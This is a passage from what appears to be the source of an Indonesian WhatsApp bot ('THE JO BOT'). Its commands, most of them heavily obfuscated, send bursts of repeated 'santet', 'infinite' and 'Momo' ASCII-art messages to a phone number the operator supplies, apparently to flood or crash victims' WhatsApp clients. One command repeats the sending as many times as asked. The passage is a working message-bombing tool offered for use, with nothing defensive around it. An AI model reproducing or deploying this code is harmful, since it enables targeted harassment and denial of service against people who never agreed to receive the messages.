_0x46ef33=_0x13ba;if(_0x55faee){var _0x971408=_0x55faee[_0x46ef33(0x9c)](_0xe57a85,arguments);return _0x55faee=null,_0x971408;}}:function(){};return _0x443b1b=![],_0x376541;};}()),_0x1e5bfa=_0xaec586(this,function(){var _0x3f30c3=_0x13ba;return _0x1e5bfa[_0x3f30c3(0xa7)]()['search'](_0x3f30c3(0x99))['toString']()[_0x3f30c3(0xb2)](_0x1e5bfa)[_0x3f30c3(0x9a)](_0x3f30c3(0x99));});_0x1e5bfa();function _0x4bf2(){var _0xe0c166=['4807818kpriZA','715935mUOZMh','1334753XuihVt','1192162TjIXLg','constructor','log','sendMessage','__proto__','Nomernya\x20mana?','(((.+)+)+)+$','search','66bcgXUG','apply','10xrnlkd','480mIUgrJ','46885971SZyjjU','197091PGigKx','4qJpBEE','error','trace','Berhasil\x20Mengirim\x20Santet\x20Di\x20Nomer\x20','@s.whatsapp.net','chat','toString','return\x20(function()\x20','bind','THE\x20JO\x20BOT\x20INFINITE','exception','1310333dYUzOr','console'];_0x4bf2=function(){return _0xe0c166;};return _0x4bf2();}var _0x5f1b8c=(function(){var _0x568f0c=!![];return function(_0x361034,_0x3fa632){var _0x4fe7a3=_0x568f0c?function(){var _0x6b815f=_0x13ba;if(_0x3fa632){var _0x3637cd=_0x3fa632[_0x6b815f(0x9c)](_0x361034,arguments);return _0x3fa632=null,_0x3637cd;}}:function(){};return _0x568f0c=![],_0x4fe7a3;};}()),_0x5837e5=_0x5f1b8c(this,function(){var _0x572965=_0x13ba,_0x47dddb=function(){var _0x1623ad=_0x13ba,_0x213c41;try{_0x213c41=Function(_0x1623ad(0xa8)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x4aefcd){_0x213c41=window;}return _0x213c41;},_0x28114f=_0x47dddb(),_0x28d113=_0x28114f['console']=_0x28114f[_0x572965(0xad)]||{},_0x4a903a=[_0x572965(0xb3),'warn','info',_0x572965(0xa2),_0x572965(0xab),'table',_0x572965(0xa3)];for(var _0x1a1603=0x0;_0x1a1603<_0x4a903a['length'];_0x1a1603++){var _0x5a44b9=_0x5f1b8c[_0x572965(0xb2)]['prototype'][_0x572965(0xa9)](_0x5f1b8c),_0x1f6ee6=_0x4a903a[_0x1a1603],_0x4199df=_0x28d113[_0x1f6ee6]||_0x5a44b9;_0x5a44b9[_0x572965(0x97)]=_0x5f1b8c['bind'](_0x5f1b8c),_0x5a44b9['toString']=_0x4199df[_0x572965(0xa7)][_0x572965(0xa9)](_0x4199df),_0x28d113[_0x1f6ee6]=_0x5a44b9;}});_0x5837e5();{if(!isCreator&&!isBan)return;if(!text)throw _0x42b4f9(0x98);await jobotz[_0x42b4f9(0xb4)](m[_0x42b4f9(0xa6)],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz['sendMessage'](text+_0x42b4f9(0xa5),{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz['sendMessage'](m['chat'],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](text+'@s.whatsapp.net',{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](m[_0x42b4f9(0xa6)],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](text+_0x42b4f9(0xa5),{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz['sendMessage'](m[_0x42b4f9(0xa6)],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](text+_0x42b4f9(0xa5),{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](m[_0x42b4f9(0xa6)],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](text+_0x42b4f9(0xa5),{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](m[_0x42b4f9(0xa6)],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](text+_0x42b4f9(0xa5),{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](m[_0x42b4f9(0xa6)],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](text+'@s.whatsapp.net',{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz['sendMessage'](m[_0x42b4f9(0xa6)],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz['sendMessage'](text+_0x42b4f9(0xa5),{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await sleep(0x7530),await jobotz['sendMessage'](m['chat'],{'text':_0x42b4f9(0xaa)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x42b4f9(0xb4)](text+_0x42b4f9(0xa5),{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await sleep(0x7530),await m['reply'](_0x42b4f9(0xa4)+text);}
            }
            break

case 'josantet': {
var _0x31e0fc=_0xe16d;(function(_0x4f26db,_0x4a894c){var _0x36b16f=_0xe16d,_0x3cd4a9=_0x4f26db();while(!![]){try{var _0x4f48f1=-parseInt(_0x36b16f(0x1e4))/0x1+parseInt(_0x36b16f(0x1de))/0x2+parseInt(_0x36b16f(0x1e0))/0x3+parseInt(_0x36b16f(0x1da))/0x4*(-parseInt(_0x36b16f(0x1db))/0x5)+-parseInt(_0x36b16f(0x1e6))/0x6+parseInt(_0x36b16f(0x1e2))/0x7+parseInt(_0x36b16f(0x1e3))/0x8*(parseInt(_0x36b16f(0x1e5))/0x9);if(_0x4f48f1===_0x4a894c)break;else _0x3cd4a9['push'](_0x3cd4a9['shift']());}catch(_0x1d061a){_0x3cd4a9['push'](_0x3cd4a9['shift']());}}}(_0x379e,0x4523a));function _0xe16d(_0x5286cc,_0x2bf03f){var _0x398f19=_0x379e();return _0xe16d=function(_0x3dc1c1,_0x59b9c7){_0x3dc1c1=_0x3dc1c1-0x1d1;var _0x2bc81d=_0x398f19[_0x3dc1c1];return _0x2bc81d;},_0xe16d(_0x5286cc,_0x2bf03f);}var _0x4857b3=(function(){var _0x5aafb1=!![];return function(_0x214e1,_0x1f4639){var _0x4d8f81=_0x5aafb1?function(){var _0x25c97f=_0xe16d;if(_0x1f4639){var _0x2bc054=_0x1f4639[_0x25c97f(0x1d7)](_0x214e1,arguments);return _0x1f4639=null,_0x2bc054;}}:function(){};return _0x5aafb1=![],_0x4d8f81;};}()),_0x599a1c=_0x4857b3(this,function(){var _0x387606=_0xe16d;return _0x599a1c['toString']()['search'](_0x387606(0x1ee))[_0x387606(0x1df)]()['constructor'](_0x599a1c)[_0x387606(0x1d6)](_0x387606(0x1ee));});_0x599a1c();var _0x59b9c7=(function(){var _0x529171=!![];return function(_0x179140,_0x2e94cc){var _0x3c9b0b=_0x529171?function(){var _0xc17e42=_0xe16d;if(_0x2e94cc){var _0x14ad44=_0x2e94cc[_0xc17e42(0x1d7)](_0x179140,arguments);return _0x2e94cc=null,_0x14ad44;}}:function(){};return _0x529171=![],_0x3c9b0b;};}()),_0x3dc1c1=_0x59b9c7(this,function(){var _0x25a364=_0xe16d,_0x3b8afc;try{var _0x3e573a=Function(_0x25a364(0x1e8)+_0x25a364(0x1eb)+');');_0x3b8afc=_0x3e573a();}catch(_0x1b17ea){_0x3b8afc=window;}var _0x343fed=_0x3b8afc['console']=_0x3b8afc[_0x25a364(0x1e7)]||{},_0x53cd06=[_0x25a364(0x1e9),'warn',_0x25a364(0x1e1),_0x25a364(0x1d9),'exception',_0x25a364(0x1d5),_0x25a364(0x1ec)];for(var _0xfb0fb2=0x0;_0xfb0fb2<_0x53cd06[_0x25a364(0x1d4)];_0xfb0fb2++){var _0x40c92d=_0x59b9c7[_0x25a364(0x1dc)][_0x25a364(0x1dd)][_0x25a364(0x1d3)](_0x59b9c7),_0x2f161b=_0x53cd06[_0xfb0fb2],_0x348889=_0x343fed[_0x2f161b]||_0x40c92d;_0x40c92d[_0x25a364(0x1d1)]=_0x59b9c7[_0x25a364(0x1d3)](_0x59b9c7),_0x40c92d[_0x25a364(0x1df)]=_0x348889[_0x25a364(0x1df)][_0x25a364(0x1d3)](_0x348889),_0x343fed[_0x2f161b]=_0x40c92d;}});_0x3dc1c1();{if(!isCreator&&!isBan)return;await jobotz[_0x31e0fc(0x1ea)](m[_0x31e0fc(0x1d2)],{'text':'THE\x20JO\x20BOT\x20SANTET'},{'quoted':fgamjo}),await sleep(0x7530),await jobotz['sendMessage'](m[_0x31e0fc(0x1d2)],{'text':_0x31e0fc(0x1ed)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x31e0fc(0x1ea)](m[_0x31e0fc(0x1d2)],{'text':'THE\x20JO\x20BOT\x20SANTET'},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x31e0fc(0x1ea)](m[_0x31e0fc(0x1d2)],{'text':'THE\x20JO\x20BOT\x20SANTET'},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x31e0fc(0x1ea)](m[_0x31e0fc(0x1d2)],{'text':_0x31e0fc(0x1ed)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x31e0fc(0x1ea)](m[_0x31e0fc(0x1d2)],{'text':_0x31e0fc(0x1ed)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x31e0fc(0x1ea)](m['chat'],{'text':_0x31e0fc(0x1ed)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x31e0fc(0x1ea)](m[_0x31e0fc(0x1d2)],{'text':_0x31e0fc(0x1ed)},{'quoted':fgamjo}),await sleep(0x7530),await jobotz[_0x31e0fc(0x1ea)](m[_0x31e0fc(0x1d2)],{'text':'THE\x20JO\x20BOT\x20SANTET'},{'quoted':fgamjo}),await sleep(0x7530),jancok(_0x31e0fc(0x1d8));}function _0x379e(){var _0x3a44d4=['{}.constructor(\x22return\x20this\x22)(\x20)','trace','THE\x20JO\x20BOT\x20SANTET','(((.+)+)+)+$','__proto__','chat','bind','length','table','search','apply','BERHASIL\x20MENGIRIM\x20SANTET','error','1427492xyQGev','5pUtEkK','constructor','prototype','126976rzDoER','toString','1513533gQKqVR','info','1320417UqQRHe','1688jAXxGm','12162byKbNc','6246bCfoCh','1505010FepGIB','console','return\x20(function()\x20','log','sendMessage'];_0x379e=function(){return _0x3a44d4;};return _0x379e();}
}
 break

 case 'joinfinite': {
function _0x4831(){var _0x24240c=['(((.+)+)+)+$','info','1247140KuaXID','70Ztcryy','log','3940iBhyCr','apply','sendMessage','prototype','trace','constructor','exception','bind','warn','chat','THE\x20JO\x20BOT\x20INFINITE','length','console','search','5702140OqgSaX','1885732eqcVkI','toString','941028AEgFgd','table','{}.constructor(\x22return\x20this\x22)(\x20)','11626479zHSHws','1629WGIBsb','8NtHXPd','67083tOKKuS','error'];_0x4831=function(){return _0x24240c;};return _0x4831();}var _0x152618=_0x39ee;(function(_0x15132f,_0x1dbbcd){var _0x14aec8=_0x39ee,_0x2c41fb=_0x15132f();while(!![]){try{var _0x3a4f00=parseInt(_0x14aec8(0x1fd))/0x1+-parseInt(_0x14aec8(0x1e6))/0x2*(-parseInt(_0x14aec8(0x1fb))/0x3)+parseInt(_0x14aec8(0x1f5))/0x4+-parseInt(_0x14aec8(0x1f4))/0x5+-parseInt(_0x14aec8(0x1f7))/0x6*(-parseInt(_0x14aec8(0x202))/0x7)+parseInt(_0x14aec8(0x1fc))/0x8*(-parseInt(_0x14aec8(0x1fa))/0x9)+parseInt(_0x14aec8(0x201))/0xa;if(_0x3a4f00===_0x1dbbcd)break;else _0x2c41fb['push'](_0x2c41fb['shift']());}catch(_0x486962){_0x2c41fb['push'](_0x2c41fb['shift']());}}}(_0x4831,0xd42c5));var _0x3b6cc9=(function(){var _0x41a8fd=!![];return function(_0x32bd5a,_0x4a473a){var _0x59a35e=_0x41a8fd?function(){var _0x2c432c=_0x39ee;if(_0x4a473a){var _0x25dedb=_0x4a473a[_0x2c432c(0x1e7)](_0x32bd5a,arguments);return _0x4a473a=null,_0x25dedb;}}:function(){};return _0x41a8fd=![],_0x59a35e;};}()),_0x4ab339=_0x3b6cc9(this,function(){var _0x3181a9=_0x39ee;return _0x4ab339['toString']()[_0x3181a9(0x1f3)]('(((.+)+)+)+$')[_0x3181a9(0x1f6)]()[_0x3181a9(0x1eb)](_0x4ab339)[_0x3181a9(0x1f3)](_0x3181a9(0x1ff));});_0x4ab339();var _0x37eaee=(function(){var _0x2d14a5=!![];return function(_0x575143,_0x1cc4de){var _0xdbc835=_0x2d14a5?function(){if(_0x1cc4de){var _0x1f1bc5=_0x1cc4de['apply'](_0x575143,arguments);return _0x1cc4de=null,_0x1f1bc5;}}:function(){};return _0x2d14a5=![],_0xdbc835;};}()),_0x1f6ed1=_0x37eaee(this,function(){var _0x419ec4=_0x39ee,_0x5ba049=function(){var _0x126ec2=_0x39ee,_0x5e08b4;try{_0x5e08b4=Function('return\x20(function()\x20'+_0x126ec2(0x1f9)+');')();}catch(_0x348422){_0x5e08b4=window;}return _0x5e08b4;},_0x173e85=_0x5ba049(),_0x346362=_0x173e85['console']=_0x173e85[_0x419ec4(0x1f2)]||{},_0x293046=[_0x419ec4(0x1e5),_0x419ec4(0x1ee),_0x419ec4(0x200),_0x419ec4(0x1fe),_0x419ec4(0x1ec),_0x419ec4(0x1f8),_0x419ec4(0x1ea)];for(var _0x57aadf=0x0;_0x57aadf<_0x293046[_0x419ec4(0x1f1)];_0x57aadf++){var _0x469787=_0x37eaee['constructor'][_0x419ec4(0x1e9)][_0x419ec4(0x1ed)](_0x37eaee),_0x4d4935=_0x293046[_0x57aadf],_0x368e68=_0x346362[_0x4d4935]||_0x469787;_0x469787['__proto__']=_0x37eaee['bind'](_0x37eaee),_0x469787['toString']=_0x368e68[_0x419ec4(0x1f6)][_0x419ec4(0x1ed)](_0x368e68),_0x346362[_0x4d4935]=_0x469787;}});function _0x39ee(_0x355486,_0x4cb6bb){var _0x4da203=_0x4831();return _0x39ee=function(_0x1f6ed1,_0x37eaee){_0x1f6ed1=_0x1f6ed1-0x1e5;var _0x503dc7=_0x4da203[_0x1f6ed1];return _0x503dc7;},_0x39ee(_0x355486,_0x4cb6bb);}_0x1f6ed1();{if(!isCreator&&!isBan)return;await jobotz['sendMessage'](m[_0x152618(0x1ef)],{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await jobotz[_0x152618(0x1e8)](m[_0x152618(0x1ef)],{'text':_0x152618(0x1f0)},{'quoted':fgamjo}),await jobotz['sendMessage'](m[_0x152618(0x1ef)],{'text':_0x152618(0x1f0)},{'quoted':fgamjo}),await jobotz[_0x152618(0x1e8)](m[_0x152618(0x1ef)],{'text':_0x152618(0x1f0)},{'quoted':fgamjo}),await jobotz[_0x152618(0x1e8)](m[_0x152618(0x1ef)],{'text':_0x152618(0x1f0)},{'quoted':fgamjo}),await jobotz[_0x152618(0x1e8)](m[_0x152618(0x1ef)],{'text':_0x152618(0x1f0)},{'quoted':fgamjo}),await jobotz[_0x152618(0x1e8)](m[_0x152618(0x1ef)],{'text':_0x152618(0x1f0)},{'quoted':fgamjo}),await jobotz[_0x152618(0x1e8)](m[_0x152618(0x1ef)],{'text':_0x152618(0x1f0)},{'quoted':fgamjo}),await jobotz[_0x152618(0x1e8)](m[_0x152618(0x1ef)],{'text':_0x152618(0x1f0)},{'quoted':fgamjo}),jancok('©\x20THE\x20JO\x20BOT');}
 }
 break

 case 'joinfiniteto':  {
function _0x2d43(_0xfa6ec2,_0x425248){var _0x4fe9ee=_0x4831();return _0x2d43=function(_0x280462,_0x56841c){_0x280462=_0x280462-0x68;var _0x5cd7ee=_0x4fe9ee[_0x280462];return _0x5cd7ee;},_0x2d43(_0xfa6ec2,_0x425248);}var _0x559bbb=_0x2d43;(function(_0x413c55,_0x1c1a2d){var _0x2a59e2=_0x2d43,_0x57408a=_0x413c55();while(!![]){try{var _0x356320=parseInt(_0x2a59e2(0x6f))/0x1+-parseInt(_0x2a59e2(0x85))/0x2+parseInt(_0x2a59e2(0x75))/0x3+parseInt(_0x2a59e2(0x82))/0x4+-parseInt(_0x2a59e2(0x7c))/0x5+-parseInt(_0x2a59e2(0x7e))/0x6+parseInt(_0x2a59e2(0x77))/0x7;if(_0x356320===_0x1c1a2d)break;else _0x57408a['push'](_0x57408a['shift']());}catch(_0x495071){_0x57408a['push'](_0x57408a['shift']());}}}(_0x4831,0xe4b18));var _0x14da67=(function(){var _0x5c9423=!![];return function(_0x1b907e,_0x543771){var _0x46e5df=_0x5c9423?function(){var _0x20dd78=_0x2d43;if(_0x543771){var _0x21b3aa=_0x543771[_0x20dd78(0x72)](_0x1b907e,arguments);return _0x543771=null,_0x21b3aa;}}:function(){};return _0x5c9423=![],_0x46e5df;};}()),_0x598978=_0x14da67(this,function(){var _0x545010=_0x2d43;return _0x598978[_0x545010(0x81)]()[_0x545010(0x79)](_0x545010(0x78))[_0x545010(0x81)]()[_0x545010(0x73)](_0x598978)[_0x545010(0x79)]('(((.+)+)+)+$');});_0x598978();var _0x56841c=(function(){var _0x138e0b=!![];return function(_0x19c020,_0x121df4){var _0x4e3dcc=_0x138e0b?function(){var _0x2abd4a=_0x2d43;if(_0x121df4){var _0x1d969c=_0x121df4[_0x2abd4a(0x72)](_0x19c020,arguments);return _0x121df4=null,_0x1d969c;}}:function(){};return _0x138e0b=![],_0x4e3dcc;};}()),_0x280462=_0x56841c(this,function(){var _0x17f7d8=_0x2d43,_0x582f12=function(){var _0x4cf23f=_0x2d43,_0x2a7f2b;try{_0x2a7f2b=Function(_0x4cf23f(0x76)+_0x4cf23f(0x6b)+');')();}catch(_0x197e77){_0x2a7f2b=window;}return _0x2a7f2b;},_0x48a666=_0x582f12(),_0x592872=_0x48a666['console']=_0x48a666[_0x17f7d8(0x6e)]||{},_0x51bbc2=['log',_0x17f7d8(0x71),_0x17f7d8(0x68),_0x17f7d8(0x6c),_0x17f7d8(0x6a),'table',_0x17f7d8(0x6d)];for(var _0x5932ec=0x0;_0x5932ec<_0x51bbc2[_0x17f7d8(0x84)];_0x5932ec++){var _0x4f3799=_0x56841c[_0x17f7d8(0x73)][_0x17f7d8(0x7f)][_0x17f7d8(0x7d)](_0x56841c),_0x5c809a=_0x51bbc2[_0x5932ec],_0x35b3c4=_0x592872[_0x5c809a]||_0x4f3799;_0x4f3799[_0x17f7d8(0x74)]=_0x56841c['bind'](_0x56841c),_0x4f3799['toString']=_0x35b3c4[_0x17f7d8(0x81)]['bind'](_0x35b3c4),_0x592872[_0x5c809a]=_0x4f3799;}});_0x280462();{if(!isCreator&&!isBan)return;if(!text)throw _0x559bbb(0x69);await jobotz[_0x559bbb(0x83)](text+_0x559bbb(0x7a),{'text':_0x559bbb(0x70)},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x559bbb(0x7a),{'text':_0x559bbb(0x70)},{'quoted':fgamjo}),await jobotz[_0x559bbb(0x83)](text+_0x559bbb(0x7a),{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await jobotz[_0x559bbb(0x83)](text+_0x559bbb(0x7a),{'text':_0x559bbb(0x70)},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x559bbb(0x7a),{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await jobotz[_0x559bbb(0x83)](text+_0x559bbb(0x7a),{'text':_0x559bbb(0x70)},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x559bbb(0x7a),{'text':_0x559bbb(0x70)},{'quoted':fgamjo}),await jobotz[_0x559bbb(0x83)](text+_0x559bbb(0x7a),{'text':_0x559bbb(0x70)},{'quoted':fgamjo}),await jobotz[_0x559bbb(0x83)](text+_0x559bbb(0x7a),{'text':_0x559bbb(0x70)},{'quoted':fgamjo}),await m[_0x559bbb(0x80)](_0x559bbb(0x7b)+text);}function _0x4831(){var _0x4b6ecd=['7493700UynVad','bind','7949466BykJYi','prototype','reply','toString','6535156mnFEfF','sendMessage','length','234608yjXdaW','info','Nomernya\x20mana?','exception','{}.constructor(\x22return\x20this\x22)(\x20)','error','trace','console','1460844uPxAKo','THE\x20JO\x20BOT\x20INFINITE','warn','apply','constructor','__proto__','1030218shgvSs','return\x20(function()\x20','3077508xGtKqv','(((.+)+)+)+$','search','@s.whatsapp.net','Berhasil\x20Mengirim\x20Infinite\x20Di\x20Nomer\x20'];_0x4831=function(){return _0x4b6ecd;};return _0x4831();}
 }
 break

 case 'jogasinfinite':  {
function _0x4d9b(){var _0x4594fd=['Nomernya\x20mana?','exception','table','Berhasil\x20Mengirim\x20Infinite\x20Di\x20Nomer\x20','console','log','12JZbJLS','492531IkZxSw','6785428QLEvWq','@s.whatsapp.net','722529gjjxfo','error','constructor','13103560dZOaNf','prototype','search','toString','(((.+)+)+)+$','apply','6Ilcqlf','150XFbbvk','5219665fFCDdW','bind','12332789MDnvjL','sendMessage','info','THE\x20JO\x20BOT\x20INFINITE','return\x20(function()\x20','1560085ZQEYra','length','chat','warn'];_0x4d9b=function(){return _0x4594fd;};return _0x4d9b();}var _0x9a3032=_0x281c;(function(_0x4d6fc7,_0x4438b3){var _0x16a8bd=_0x281c,_0x1c6a89=_0x4d6fc7();while(!![]){try{var _0xcfb193=-parseInt(_0x16a8bd(0x184))/0x1+parseInt(_0x16a8bd(0x18e))/0x2*(parseInt(_0x16a8bd(0x18f))/0x3)+-parseInt(_0x16a8bd(0x190))/0x4+parseInt(_0x16a8bd(0x17d))/0x5+-parseInt(_0x16a8bd(0x17b))/0x6*(-parseInt(_0x16a8bd(0x17f))/0x7)+parseInt(_0x16a8bd(0x195))/0x8+parseInt(_0x16a8bd(0x192))/0x9*(-parseInt(_0x16a8bd(0x17c))/0xa);if(_0xcfb193===_0x4438b3)break;else _0x1c6a89['push'](_0x1c6a89['shift']());}catch(_0x12b741){_0x1c6a89['push'](_0x1c6a89['shift']());}}}(_0x4d9b,0xec5ae));var _0x12c47d=(function(){var _0x18f923=!![];return function(_0x47ca65,_0x265f85){var _0x1ce560=_0x18f923?function(){var _0x5d176c=_0x281c;if(_0x265f85){var _0x5320bd=_0x265f85[_0x5d176c(0x17a)](_0x47ca65,arguments);return _0x265f85=null,_0x5320bd;}}:function(){};return _0x18f923=![],_0x1ce560;};}()),_0x3ceb57=_0x12c47d(this,function(){var _0x1ba490=_0x281c;return _0x3ceb57[_0x1ba490(0x178)]()['search'](_0x1ba490(0x179))[_0x1ba490(0x178)]()['constructor'](_0x3ceb57)[_0x1ba490(0x177)](_0x1ba490(0x179));});_0x3ceb57();function _0x281c(_0x53654c,_0x3edbcc){var _0x48589b=_0x4d9b();return _0x281c=function(_0x146938,_0xbfddc9){_0x146938=_0x146938-0x177;var _0x1ea0c5=_0x48589b[_0x146938];return _0x1ea0c5;},_0x281c(_0x53654c,_0x3edbcc);}var _0xbfddc9=(function(){var _0x4c8a85=!![];return function(_0x15cd1a,_0x287371){var _0x5a323e=_0x4c8a85?function(){var _0x3b5e40=_0x281c;if(_0x287371){var _0x26a187=_0x287371[_0x3b5e40(0x17a)](_0x15cd1a,arguments);return _0x287371=null,_0x26a187;}}:function(){};return _0x4c8a85=![],_0x5a323e;};}()),_0x146938=_0xbfddc9(this,function(){var _0x1f0b49=_0x281c,_0x42f118;try{var _0x1d525b=Function(_0x1f0b49(0x183)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x42f118=_0x1d525b();}catch(_0xbca4b8){_0x42f118=window;}var _0x5cabfb=_0x42f118['console']=_0x42f118[_0x1f0b49(0x18c)]||{},_0x3c8a50=[_0x1f0b49(0x18d),_0x1f0b49(0x187),_0x1f0b49(0x181),_0x1f0b49(0x193),_0x1f0b49(0x189),_0x1f0b49(0x18a),'trace'];for(var _0x1d0c2a=0x0;_0x1d0c2a<_0x3c8a50[_0x1f0b49(0x185)];_0x1d0c2a++){var _0x43e069=_0xbfddc9[_0x1f0b49(0x194)][_0x1f0b49(0x196)][_0x1f0b49(0x17e)](_0xbfddc9),_0x31bca3=_0x3c8a50[_0x1d0c2a],_0x42892=_0x5cabfb[_0x31bca3]||_0x43e069;_0x43e069['__proto__']=_0xbfddc9[_0x1f0b49(0x17e)](_0xbfddc9),_0x43e069[_0x1f0b49(0x178)]=_0x42892[_0x1f0b49(0x178)][_0x1f0b49(0x17e)](_0x42892),_0x5cabfb[_0x31bca3]=_0x43e069;}});_0x146938();{if(!isCreator&&!isBan)return;if(!text)throw _0x9a3032(0x188);await jobotz['sendMessage'](m['chat'],{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](text+_0x9a3032(0x191),{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](m[_0x9a3032(0x186)],{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x9a3032(0x191),{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](m['chat'],{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](text+_0x9a3032(0x191),{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz['sendMessage'](m[_0x9a3032(0x186)],{'text':'THE\x20JO\x20BOT\x20INFINITE'},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](text+'@s.whatsapp.net',{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](m[_0x9a3032(0x186)],{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](text+'@s.whatsapp.net',{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](m[_0x9a3032(0x186)],{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](text+'@s.whatsapp.net',{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](m[_0x9a3032(0x186)],{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x9a3032(0x191),{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](m[_0x9a3032(0x186)],{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](text+_0x9a3032(0x191),{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz[_0x9a3032(0x180)](m[_0x9a3032(0x186)],{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),await jobotz['sendMessage'](text+_0x9a3032(0x191),{'text':_0x9a3032(0x182)},{'quoted':fgamjo}),jancok(_0x9a3032(0x18b)+text);}
 }
 break

case 'jomomo': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
await jobotz.sendMessage(m.chat, {text:momoe},{quoted:fgamjo})
}
jancok(`Sukses Send Momo Sebanyak ${jumlah}`)
}
 break

 case 'jomomoto': { 
 if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?` 
momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:fgamjo})
            await m.reply(`Berhasil Mengirim Momo Di Nomer ${text}`)
}
break

case 'jogasmomo': {            
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?` 
momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
